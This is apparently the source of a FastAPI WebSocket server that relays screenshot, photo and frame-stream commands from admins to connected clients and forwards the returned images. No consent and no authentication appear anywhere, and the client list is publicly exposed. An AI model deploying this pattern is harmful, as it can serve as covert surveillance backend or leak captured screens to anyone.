from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from typing import Dict
import random
import json

app = FastAPI()

clients: Dict[str, WebSocket] = {}
admins: list[WebSocket] = []

def generate_client_id():
    """Generate a unique 4-digit ID"""
    while True:
        client_id = f"{random.randint(1000, 9999)}"
        if client_id not in clients:
            return client_id

@app.get("/")
async def root():
    return {"status": "Server is running", "clients": len(clients), "admins": len(admins)}

@app.get("/clients")
async def get_clients():
    return {"clients": list(clients.keys())}

# =========================
# CLIENT CONNECT
# =========================
@app.websocket("/ws/client")
async def client_ws(websocket: WebSocket):
    await websocket.accept()
    
    # Generate unique ID for client
    client_id = generate_client_id()
    clients[client_id] = websocket
    
    # Send ID to client
    await websocket.send_json({
        "type": "id_assigned",
        "client_id": client_id
    })
    
    print(f"✅ Client {client_id} connected")
    
    # Notify all admins about new client
    for admin in admins:
        try:
            await admin.send_json({
                "type": "client_list",
                "clients": list(clients.keys())
            })
        except:
            pass
    
    try:
        while True:
            data = await websocket.receive_text()
            
            # If it's a ping, ignore
            if data == "ping":
                continue
            
            # If client sends image -> forward to all admins
            for admin in admins:
                try:
                    await admin.send_json({
                        "type": "screenshot",
                        "client_id": client_id,
                        "image": data
                    })
                except:
                    pass

    except WebSocketDisconnect:
        clients.pop(client_id, None)
        print(f"❌ Client {client_id} disconnected")
        
        # Notify all admins about disconnection
        for admin in admins:
            try:
                await admin.send_json({
                    "type": "client_list",
                    "clients": list(clients.keys())
                })
            except:
                pass


# =========================
# ADMIN CONNECT
# =========================
@app.websocket("/ws/admin")
async def admin_ws(websocket: WebSocket):
    await websocket.accept()
    admins.append(websocket)
    print("👤 Admin connected")
    
    # Send current client list to newly connected admin
    await websocket.send_json({
        "type": "client_list",
        "clients": list(clients.keys())
    })
    
    try:
        while True:
            data = await websocket.receive_json()

            # data = {"action": "take_photo", "client_id": "1234"}
            # or data = {"action": "stream_frame", "client_id": "1234", "quality": "medium"}
            if data.get("action") == "take_photo":
                client_id = data.get("client_id")
                if client_id in clients:
                    await clients[client_id].send_text("take_photo")
                    print(f"📸 Screenshot requested for client {client_id}")
            
            elif data.get("action") == "stream_frame":
                client_id = data.get("client_id")
                quality = data.get("quality", "medium")
                if client_id in clients:
                    await clients[client_id].send_json({
                        "action": "stream_frame",
                        "quality": quality
                    })


    except WebSocketDisconnect:
        admins.remove(websocket)
        print("👤 Admin disconnected")
